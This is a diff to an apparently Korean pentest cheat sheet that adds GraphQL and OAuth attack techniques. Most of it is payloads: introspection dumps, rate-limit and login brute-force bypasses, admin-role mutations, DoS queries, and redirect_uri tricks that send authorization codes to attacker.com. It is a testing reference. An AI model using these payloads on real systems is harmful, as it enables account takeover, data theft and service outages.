@@ -597,45 +597,189 @@ for t in threads: t.join()
 
 ## GraphQL 공격
 
-```bash
-# Introspection Query (스키마 전체 노출)
-{"query":"{ __schema { queryType { name } types { name fields { name type { name } } } } }"}
+GraphQL 은 단일 엔드포인트(`/graphql`, `/api/graphql`, `/v1/graphql` 등) 에 다양한 쿼리/뮤테이션을 받기 때문에 권한 분리/Rate Limit 가 자주 깨짐.
 
-# 특정 타입 필드 확인
-{"query":"{ __type(name:\"User\") { fields { name type { name } } } }"}
-```
+### 엔드포인트 식별
 
 ```bash
-# 인증 우회 / 권한 상승 시도
-{"query":"{ users { id username email password } }"}
+# 흔한 경로 퍼징
+ffuf -u http://TARGET/FUZZ -w \
+  /usr/share/seclists/Discovery/Web-Content/graphql.txt -mc 200,400
 
-# Mutation을 통한 데이터 변조
-{"query":"mutation { updateUser(id:1, role:\"admin\") { id role } }"}
+# Apollo / Hasura / GraphiQL 노출
+curl -s http://TARGET/graphql | grep -iE 'graphiql|playground|apollo'
 
-# Batch Query (Rate Limit 우회)
-[{"query":"{ user(id:1) { email } }"},{"query":"{ user(id:2) { email } }"},...]
-
-# 도구: InQL (Burp 확장), graphql-voyager, clairvoyance (Introspection 비활성화 시)
+# nuclei
+nuclei -t http/exposures/apis/graphql-detect.yaml -u http://TARGET
 ```
+
+### Introspection
+
+```bash
+# 전체 스키마
+curl -s http://TARGET/graphql -X POST -H 'Content-Type: application/json' \
+  -d '{"query":"query IntrospectionQuery { __schema { queryType{name} mutationType{name} types{name kind fields{name type{name kind ofType{name}}}}}}"}' \
+  | jq .
+
+# Burp 확장: InQL
+inql -t http://TARGET/graphql
+
+# Introspection 비활성화 시 추정 (clairvoyance)
+clairvoyance -o schema.json http://TARGET/graphql -w wordlist.txt
+```
+
+### 인증/인가 우회
+
+```bash
+# alias 로 동일 필드 N번 요청 (rate limit 우회)
+{"query":"{ a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} }"}
+
+# fragment 로 권한 체크 우회 (필드 단위 ACL 누락)
+{"query":"{ users { ...PII } } fragment PII on User { id email passwordHash mfaSecret }"}
+
+# directive 로 조건부 노출
+{"query":"query($x:Boolean!){ user(id:1) @include(if:$x){ email } }","variables":{"x":true}}
+
+# JWT/세션 헤더 변경하며 동일 mutation 반복 → IDOR 자동화
+```
+
+### Batching / Query Stacking
+
+```bash
+# JSON 배열로 다중 쿼리 (rate limit / brute force 우회)
+[{"query":"mutation{login(u:\"a\",p:\"p1\"){t}}"},
+ {"query":"mutation{login(u:\"a\",p:\"p2\"){t}}"},
+ {"query":"mutation{login(u:\"a\",p:\"p3\"){t}}"}]
+
+# Apollo Persisted Queries 우회: APQ 해시 강제 미사용
+{"query":"...","extensions":{}}
+```
+
+### DoS / Cost
+
+```bash
+# 깊이 폭주
+{ user{ friends{ friends{ friends{ friends{ id } } } } } }
+
+# 비용 폭주 (페이징 N x M)
+{ users(first:10000){ posts(first:10000){ id } } }
+
+# Apollo / 일부 서버는 maxAliases / maxDepth / cost analysis 미적용
+```
+
+### 뮤테이션 악용
+
+```bash
+# 권한 검사가 query 에만 있고 mutation 에 없는 경우
+{"query":"mutation{ updateUser(id:1, role:\"admin\"){id role}}"}
+{"query":"mutation{ resetPassword(userId:1, newPassword:\"x\"){ok}}"}
+
+# Webhook / file upload mutation → SSRF / 임의 파일 업로드
+```
+
+### 도구
+
+- [InQL](https://github.com/doyensec/inql) — Burp 확장, 스키마 시각화/요청 생성
+- [GraphQL Voyager](https://github.com/IvanGoncharov/graphql-voyager) — 스키마 시각화
+- [graphw00f](https://github.com/dolevf/graphw00f) — GraphQL 엔진 핑거프린팅
+- [clairvoyance](https://github.com/nikitastupin/clairvoyance) — Introspection 차단 우회
+- [graphqlmap](https://github.com/swisskyrepo/GraphQLmap) — 인터랙티브 익스플로잇
 
 ---
 
 ## OAuth 공격
 
+### 식별
+
 ```bash
-# 1. Open Redirect → Authorization Code 탈취
-# redirect_uri 파라미터에 공격자 서버 지정
-https://auth.target.com/authorize?client_id=ID&redirect_uri=https://attacker.com/callback&response_type=code
+# Authorization Server / 메타데이터
+curl -s https://auth.target.com/.well-known/openid-configuration | jq .
+curl -s https://auth.target.com/.well-known/oauth-authorization-server | jq .
 
-# 2. CSRF (state 파라미터 미검증)
-# state 없이 authorization flow 시작 → 공격자의 계정 연결
-
-# 3. 토큰 유출 (Implicit Flow)
-# response_type=token → Fragment(#)에 토큰 → Referer로 유출 가능
-
-# 4. PKCE 미적용 시 Authorization Code Interception
-# 모바일 앱에서 code_verifier 없이 code만으로 토큰 교환
+# JWKS (서명 키)
+curl -s https://auth.target.com/.well-known/jwks.json | jq .
 ```
+
+### redirect_uri 악용
+
+```text
+# 허용 매칭이 약할 때
+https://auth.target.com/authorize?
+  client_id=ID&response_type=code&
+  redirect_uri=https://target.com.attacker.com/cb           # 서픽스 매칭 우회
+  redirect_uri=https://target.com@attacker.com/cb           # @ 트릭
+  redirect_uri=https://attacker.com/?https://target.com/cb  # query 인자 트릭
+  redirect_uri=https://target.com/redirect?to=//attacker    # Open Redirect chain
+```
+
+대상 흐름:
+
+| 결과 | 영향 |
+|------|------|
+| Authorization Code 가 attacker.com 로 전달 | code → token 교환 (PKCE 미사용 시 즉시 탈취) |
+| Implicit `response_type=token` 으로 access_token Fragment 유출 | Referer/JS 통해 즉시 탈취 |
+
+### state / nonce 미검증 → CSRF / 계정 탈취
+
+```text
+# state 가 검증되지 않으면 공격자가 자기 OAuth flow 의 code 를 피해자 계정에 강제 연결
+1. 공격자가 IdP 로그인 → code 획득
+2. 피해자에게 https://app.target.com/oauth/callback?code=ATTACKER_CODE 클릭 유도
+3. 피해자 세션이 공격자 IdP 계정과 link 됨 → 공격자가 그 계정으로 로그인 가능
+```
+
+### Authorization Code Injection / Replay
+
+```text
+- code 가 한 번만 사용 가능한지 (one-time use)
+- code 가 redirect_uri/client_id 와 바인딩되는지 (PKCE code_verifier)
+- code 만료 시간이 충분히 짧은지 (보통 60s)
+
+PKCE 미적용 모바일/SPA 클라이언트는 code 탈취만으로 토큰 교환 가능.
+```
+
+### scope / audience confusion
+
+```bash
+# 다른 클라이언트의 토큰을 우리 API 에 사용 (aud 미검증)
+curl -H "Authorization: Bearer <other_client_token>" https://api.target.com/v1/me
+
+# scope 상승 - authorize 단계에서 추가 scope 요청
+?scope=openid profile email admin write:all
+
+# Resource Server 에서 scope 검증 누락이면 추가 권한 획득
+```
+
+### JWT 기반 토큰 공격
+
+상세는 [JWT 공격](#jwt-공격) 섹션 참고. 주요 포인트:
+
+- `alg=none`, `kid` injection, JWKS spoofing
+- access_token 과 id_token 혼용 (Resource Server 가 id_token 도 받는 경우 audience 우회)
+- refresh_token rotation 미적용 → 영구 탈취
+
+### Client Secret / Credentials 노출
+
+```bash
+# SPA / 모바일 앱에서 client_secret 하드코딩 (있으면 안되는 값)
+strings app.apk | grep -iE 'client_secret|api_key'
+
+# .well-known/security.txt, /.git/, /env 노출
+```
+
+### Device Authorization Grant phishing
+
+```text
+# device flow 코드를 피해자에게 전달 → 피해자가 본인 계정으로 승인 → 공격자가 폴링하던 토큰 획득
+POST /device/code → user_code 입력 페이지 URL 을 피싱 메일로 전달
+```
+
+### 도구
+
+- [oauth2c](https://github.com/cloudentity/oauth2c) — CLI OAuth client (테스트용)
+- [BurpSuite OAuth Token Spoofer]
+- [Authz0](https://github.com/hahwul/authz0) — 권한 매트릭스 자동 검증
+- 패치 매핑: [oauth.net 보안 권고](https://oauth.net/articles/authentication/)
 
 ---
 
